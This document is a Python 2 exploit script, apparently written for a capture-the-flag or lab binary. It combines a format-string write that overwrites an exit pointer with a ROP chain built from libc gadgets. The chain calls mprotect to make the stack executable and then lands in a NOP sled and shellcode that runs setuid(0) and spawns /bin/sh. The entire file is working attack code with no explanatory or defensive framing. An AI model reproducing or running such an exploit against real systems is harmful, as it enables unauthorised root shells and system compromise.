import struct
import sys

addr_libc = 0x7ffff7a0d000
addr_6_pops = 0x000000000013cc0f


double_pop_addr = struct.pack("<Q", 0x0000000000117919 + addr_libc)



shellcode = "\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x68\x50\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05"

shell_addr = "\x00\x00\x7f\xff\xff\xff\xd4\x68"[::-1]
padding = 'a'*0x18
p_rax_addr = struct.pack("<Q", 0x0000000000033544 + addr_libc)
mprotect_syscall = struct.pack("<Q", 0x0000000000000008) # code of mprotect
add_rax_addr = struct.pack("<Q", 0x00000000000abf37 + addr_libc)
p_rdi_addr = struct.pack("<Q", addr_libc + 0x0000000000021102)
#stack_addr = struct.pack("<Q", 0x7ffffffdd000)
stack_addr = struct.pack("<Q", 0x7fffffffd000)
p_rsi_addr = struct.pack("<Q", addr_libc + 0x00000000000202e8)
#stack_len = struct.pack("<Q", 0x0000000000022000) # size of the stack
stack_len = struct.pack("<Q", 0x1000)
p_rdx_addr = struct.pack("<Q", addr_libc + 0x0000000000001b92)
permission_code = struct.pack("<Q", 0x00000000000007) # code of all permission
syscall = struct.pack("<Q", 0x7ffff7b14e05)

#print padding + p_rax_addr + mprotect_syscall + add_rax_addr  + p_rdi_addr + stack_addr + p_rsi_addr + stack_len + p_rdx_addr + permission_co$


shellcode_full = p_rax_addr + mprotect_syscall + add_rax_addr  + p_rdi_addr + stack_addr + p_rsi_addr + stack_len + p_rdx_addr + permission_code + syscall + shell_addr + "\x90"*256 + shellcode



triple_pop = 0x7ffff7a2fb52
double_pop = struct.pack("<Q", 0x7ffff7a2fb53)
sept_pop = struct.pack("<Q", 0x000000000013cc0f + addr_libc)

pointed_addr = sept_pop # 0x7ffff7b49c0e
exit_addr = 0x601030


def pad(s):
	return s+"A"*(512-len(s)-24)

exploit = ""

#exploit += "AAAABBBBCCCCDDDD"
#exploit += shellcode_full


#overwrite the last two bytes
exploit += "%{}x".format(0x7fff-len(exploit)-1)
exploit += " %69$n "

#first two
exploit += "%{}x".format(0x9c0e - 0x7fff -2)
exploit += " %67$hn "

#middle two
exploit += "%{}x".format(0xf7b4- 0x9c0e -2)
exploit += " %68$hn "

exploit+= "AAAAA" + shellcode_full

exploit = pad(exploit)

exploit += struct.pack("<Q", exit_addr)
exploit += struct.pack("<Q", exit_addr + 2)
exploit += struct.pack("<Q", exit_addr + 4)

print pad(exploit)
